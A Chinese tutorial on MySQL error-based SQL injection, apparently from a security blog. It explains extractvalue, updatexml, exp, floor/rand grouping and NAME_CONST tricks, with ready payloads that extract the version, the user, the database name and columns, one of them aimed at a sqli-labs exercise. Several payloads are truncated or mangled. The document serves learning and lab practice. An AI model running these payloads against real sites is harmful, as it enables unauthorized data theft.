# 原创
：  【SQL注入-可回显】报错注入：简介、相关函数、利用方法

# 【SQL注入-可回显】报错注入：简介、相关函数、利用方法

**目录**

[一、定义：](#%E4%B8%80%E3%80%81%E5%AE%9A%E4%B9%89%EF%BC%9A)

[1.1、简介：](#1.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A)

[1.2、利用：](#1.2%E3%80%81%E5%88%A9%E7%94%A8%EF%BC%9A)

[1.3、利用过程：](#1.3%E3%80%81%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%9A)

[1.4示例：](#1.4%E7%A4%BA%E4%BE%8B%EF%BC%9A)

[注：](#%E6%B3%A8%EF%BC%9A)

[二、相关函数：](#%E4%BA%8C%E3%80%81%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%EF%BC%9A)

[2.1、最常用的三种是：](#2.1%E3%80%81%E6%9C%80%E5%B8%B8%E7%94%A8%E7%9A%84%E4%B8%89%E7%A7%8D%E6%98%AF%EF%BC%9A)

[2.2、Xpath语法错误](#2.2%E3%80%81Xpath%E8%AF%AD%E6%B3%95%E9%94%99%E8%AF%AF)

[extractvalue()](#extractvalue%28%29)

[updatexml()](#updatexml%28%29)

[2.3、数据溢出](#toc-0)

[exp()](#exp%28%29)

[2.4、主键重复](#toc-2)

[原理：](#%E5%8E%9F%E7%90%86%EF%BC%9A)

[rand()：](#rand%28%29%EF%BC%9A)

[count(*)：](#count%28*%29%EF%BC%9A)

[group by x:](#group%20by%20x%3A)

[floor(x)：](#floor%28x%29%EF%BC%9A)

[2.5、函数特性报错](#2.5%E3%80%81%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7%E6%8A%A5%E9%94%99)

[列名重复](#toc-4)

[2.6、参数类型](#2.6%E3%80%81%E5%8F%82%E6%95%B0%E7%B1%BB%E5%9E%8B)

[几何函数（数字）](#%E5%87%A0%E4%BD%95%E5%87%BD%E6%95%B0%EF%BC%88%E6%95%B0%E5%AD%97%EF%BC%89)

---


---


## 一、定义：

> 
<h3>1.1、简介：</h3>
SQL报错注入：利用数据库的某些报错返回机制，刻意的制造错误条件传到数据库，使得查询结果能够出现在错误返回提示信息中


> 
<h3>1.2、利用：</h3>
需要有SQL报错信息回 显
有显示位时，首先使用union联合查询语句
无显示位时，使用报错注入


> 
<h3>1.3、利用过程：</h3>
第一步：注入点测试
第二步：查询字段数
第三步：判断回显位
第四步：查看数据库基本信息
第五步：爆数据库
第六步：爆数据库表
第七步：爆字段
第八步：爆数据
<hr/>
<h3>1.4示例：</h3>
（1）爆数据库版本信息： 

?id=1' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema. 

（2）爆当前用户：

?id=1' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tab 

（3）爆当前数据库：

?id=1' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema 

（4）爆指定表的字段

?id=1'  and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM informati 



### 1.4示例：

> 
<h3>注：</h3>
高版本的数据库，现在已经很多难以执行成功了


---


---


## 二、相关函数：

> 
<h3>2.1、最常用的三种是：</h3>
floor()、updatexml()以及extractvalue()这三个函数
现在有很多高版本都已经用不了了


> 
<h3>2.2、Xpath语法错误</h3>
extractvalue()是查询、updatexml()是改变
<h4>extractvalue()</h4>
**作用：**
对XML文档进行查询（类似在HTML文件中用标签查找元素）
------
**语法: **
extractvalue( XML_document, XPath_string )
参数1：XML_document（String格式），为XML文档对象的名称（输入错误的）
参数2：XPath_string(Xpath格式的字符串)（注入的地方）
------
**利用：**
extractvalue(1,(payload))
extractvalue(1,(concat(0x7e,(payload),0x7e)))
------
**报错原理：**
格式报错
xml文档中查找字符位置是用/xxx/xxx/xxx/...
写入其他格式就会报错，并返回注入请求的内容
报错最多32字符
------
**利用语句：**
http://localhost:8080/sqli-labs-master/Less-5/<br/> ?id=1' and extractvalue(1,concat('~',database())) --+

**注：**
在ASCII码表中，0x7e这个十六进制数代表符号~，~这个符号在xpath语法中是不存在的，因此总能报错
<hr/>
<h4>updatexml()</h4>
**作用：**
改变文档中符合条件节点的值
------
**语法: **
updatexml( XML_document, XPath_string, new_value )
参数1：XML_document（String格式），为XML文档对象的名称<br/> 参数2：XPath_string(Xpath格式的字符串)，注入时可操作的地方<br/> 参数3：new_value（String格式），替换查找到的符合条件的数据
updatexml(1, **payload**,1)
------
**报错原理:**
也是格式错误
输出的字符长度有限制，**其最长输出32位**




#### updatexml()

> 
<h3>2.3、数据溢出</h3>
<table><thead>|类型|贮存|最小值|最大值
</thead><tbody>|(Bytes)|(Signed/Unsigned)|(Signed/Unsigned)
|TINYINT|1|-128|127
|0|255
|SMALLINT|2|-32768|32767
|0|65535
|MEDIUMINT|3|-8388608|8388607
|0|16777215
|INT|4|-2147483648|2147483647
|0|4294967295
|BIGINT|8|-9223372036854775808|9223372036854775807
|0|18446744073709551615
</tbody></table>

在mysql5.5之前，整形溢出不会报错，只有版本号大于5.5.5时，才会报错
官方文档说明：[out-of-range-and-overflow](https://dev.mysql.com/doc/refman/5.5/en/out-of-range-and-overflow.html)
在mysql中，并不是输入很长数字，考虑按位取反
报错信息是有长度限制的，在mysql/my_error.c中可以看到

<hr/>

<h4>exp()</h4>
（5.5.5&lt;= MySQL数据库版本号&lt;=5.5.49）
**作用：**
计算以e（自然常数）为底的幂值
------
**语法:**
exp(x)
------
**报错原理：**
当参数x超过710时，exp()函数会报错
（错误信息：DOUBLE value is of range）
------
**注入语句：**
id=1 and EXP(~(SELECT **from (SELECT user())a))**



> 
<h3>2.4、主键重复</h3>
<h4>原理：</h4>
count()和group by
遇到rand()产生的重复值时报错

<hr/>
<h4>rand()：</h4>
生成一个0～1之间的随机浮点数
生成[ 0 , 1 ) [0,1)[0,1)之间的随机数,可以指定参数作为种子
可以通过线性运算扩大值域,比如2 ∗ r a n d ( ) 2*rand()2∗rand()就生成了[ 0 , 2 ) [0,2)[0,2)上的随机数


<hr/>
<h4>count(*)：</h4>
统计行数、某表下总共记录条数
count ( ∗ ) 搭配group by查询

<hr/>


<h4>group by x: </h4>
**作用：**
按x规则进行分组
------
**报错原理：**
利用rand()函数与group()函数的相互冲突
group by与rand()使用时，如果临时表中没有该主键，则在插入前会再计算一次<br/> rand()，然后再由group by将计算出来的主键直接插入到临时表格中，导致主键重复报错




<hr/>
<h4>floor(x)：</h4>
**作用：**
对参数x向下取整
------
**语句：**
and (select 1 from (select count(*),concat(( **payload**),floor (rand(0)*2))x from information_schema.tables group by x)a)
------
****注入语句：****
**id=1 and (select 1 from (select count(**),concat(user(),floor(rand(0)**2))x from information_schema.tables group by x)a)**
需要注意的是该语句将 **输出字符长度限制为64个字符**


#### rand()：

---


#### group by x: 

---


> 
<h3>2.5、函数特性报错</h3>
<h4>列名重复</h4>
**报错：**
mysql列名重复会报错
------
**利用：**
name_const来制造一个列
select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;


> 
<h3>2.6、参数类型</h3>
<h4>几何函数（数字）</h4>
geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()等
不满足可能会报错。php版本不同，可能会会有不同的结果


报错，那不是轻轻松松报错，哈哈哈
